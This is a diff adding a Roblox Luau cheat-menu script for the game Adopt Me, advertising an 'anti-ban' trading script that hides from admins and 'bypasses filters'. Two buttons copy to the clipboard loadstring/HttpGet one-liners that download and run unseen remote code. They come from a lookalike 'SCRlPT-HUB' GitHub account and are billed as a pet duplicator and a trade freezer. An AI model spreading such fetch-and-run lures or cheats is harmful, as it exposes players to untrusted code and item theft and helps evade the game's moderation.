@@ -1,0 +1,136 @@
+-- GUI Setup
+local player = game.Players.LocalPlayer
+local screenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
+screenGui.Name = "ScriptInfoGui"
+screenGui.ResetOnSpawn = false
+
+-- Toggle Button
+local toggleButton = Instance.new("TextButton", screenGui)
+toggleButton.Size = UDim2.new(0, 110, 0, 35)
+toggleButton.Position = UDim2.new(0, 10, 0, 10)
+toggleButton.Text = "Show Info"
+toggleButton.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
+toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+toggleButton.Font = Enum.Font.GothamSemibold
+toggleButton.TextSize = 16
+
+-- Info Frame
+local infoFrame = Instance.new("Frame", screenGui)
+infoFrame.Size = UDim2.new(0, 400, 0, 510)
+infoFrame.Position = UDim2.new(0.5, -200, 0.5, -255)
+infoFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+infoFrame.Visible = false
+infoFrame.Active = true
+infoFrame.Draggable = true
+
+-- Title
+local title = Instance.new("TextLabel", infoFrame)
+title.Size = UDim2.new(1, -40, 0, 28)
+title.Position = UDim2.new(0, 20, 0, 5)
+title.Text = "SCRIPT DESCRIPTION"
+title.BackgroundTransparency = 1
+title.TextColor3 = Color3.fromRGB(0, 255, 127)
+title.Font = Enum.Font.GothamSemibold
+title.TextSize = 20
+title.TextXAlignment = Enum.TextXAlignment.Center
+
+-- Close Button
+local closeButton = Instance.new("TextButton", infoFrame)
+closeButton.Size = UDim2.new(0, 30, 0, 30)
+closeButton.Position = UDim2.new(1, -35, 0, 5)
+closeButton.Text = "X"
+closeButton.BackgroundColor3 = Color3.fromRGB(170, 0, 0)
+closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+closeButton.Font = Enum.Font.GothamSemibold
+closeButton.TextSize = 16
+
+-- Info Text
+local infoText = Instance.new("TextLabel", infoFrame)
+infoText.Size = UDim2.new(1, -40, 0, 370)
+infoText.Position = UDim2.new(0, 20, 0, 40)
+infoText.TextWrapped = true
+infoText.TextXAlignment = Enum.TextXAlignment.Left
+infoText.TextYAlignment = Enum.TextYAlignment.Top
+infoText.TextColor3 = Color3.fromRGB(255, 255, 255)
+infoText.BackgroundTransparency = 1
+infoText.Font = Enum.Font.GothamSemibold
+infoText.TextSize = 15
+infoText.Text = [[
+🟩 SAFE FOR MAIN ACCOUNT
+🟩 ANTI-BAN SYSTEM
+🟩 AUTO LEAVES IF ADMIN IS IN THE SERVER
+
+🟩 DOESN’T WORK ON ALTS – WHY?
+— Alts have fresh inventory pet IDs and cannot replace the pet ID.
+
+🟩 WORKS BEST WITH HIGH-TIER PETS – WHY?
+— This script is designed for high-tier trading only.
+— Trash pets don’t work well because you can’t expect good trades from trash.
+
+🟩 NO ERRORS
+🟩 NO BUGS
+🟩 RUNS SMOOTHLY
+
+🟩 SUBSCRIBE TO MY YOUTUBE: @AdrianCrafts
+
+🟩 IF DOESN'T WORK:
+— TRY SERVER HOP
+— IF STILL NOT WORKING, YOU’RE PROBABLY USING AN ALT
+— IF MAIN ACCOUNT, JUST RE-EXECUTE AFTER 5 HOURS
+— SCRIPT ANALYZES THE SYSTEM TO BYPASS FILTERS
+]]
+
+-- Subsection Title
+local scriptTitle = Instance.new("TextLabel", infoFrame)
+scriptTitle.Size = UDim2.new(1, -40, 0, 20)
+scriptTitle.Position = UDim2.new(0, 20, 0, 420)
+scriptTitle.Text = "OTHER WORKING SCRIPTS – CLICK TO COPY PASTE –"
+scriptTitle.TextColor3 = Color3.fromRGB(0, 255, 255)
+scriptTitle.BackgroundTransparency = 1
+scriptTitle.Font = Enum.Font.GothamBold
+scriptTitle.TextSize = 14
+scriptTitle.TextXAlignment = Enum.TextXAlignment.Center
+
+-- Pet Duplicator Button
+local dupButton = Instance.new("TextButton", infoFrame)
+dupButton.Size = UDim2.new(1, -40, 0, 30)
+dupButton.Position = UDim2.new(0, 20, 0, 450)
+dupButton.Text = "Copy Pet Duplicator Script"
+dupButton.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
+dupButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+dupButton.Font = Enum.Font.GothamSemibold
+dupButton.TextSize = 14
+
+-- Freeze Trader Button
+local freezeButton = Instance.new("TextButton", infoFrame)
+freezeButton.Size = UDim2.new(1, -40, 0, 30)
+freezeButton.Position = UDim2.new(0, 20, 0, 485)
+freezeButton.Text = "Copy Freeze Trader Script"
+freezeButton.BackgroundColor3 = Color3.fromRGB(255, 85, 0)
+freezeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+freezeButton.Font = Enum.Font.GothamSemibold
+freezeButton.TextSize = 14
+
+-- Copy Script Functions
+local function copyToClipboard(text)
+    setclipboard(text)
+end
+
+dupButton.MouseButton1Click:Connect(function()
+    copyToClipboard([[loadstring(game:HttpGet("https://raw.githubusercontent.com/SCRlPT-HUB/AdoptMe_Script/refs/heads/main/AdoptMe_PetDuplicator",true))()]])
+end)
+
+freezeButton.MouseButton1Click:Connect(function()
+    copyToClipboard([[loadstring(game:HttpGet("https://raw.githubusercontent.com/SCRlPT-HUB/AdoptMeFreezeTrade/refs/heads/main/AdoptMe_ScriptHub",true))()]])
+end)
+
+-- Toggle & Close
+toggleButton.MouseButton1Click:Connect(function()
+	infoFrame.Visible = not infoFrame.Visible
+	toggleButton.Text = infoFrame.Visible and "Hide Info" or "Show Info"
+end)
+
+closeButton.MouseButton1Click:Connect(function()
+	infoFrame.Visible = false
+	toggleButton.Text = "Show Info"
+end)
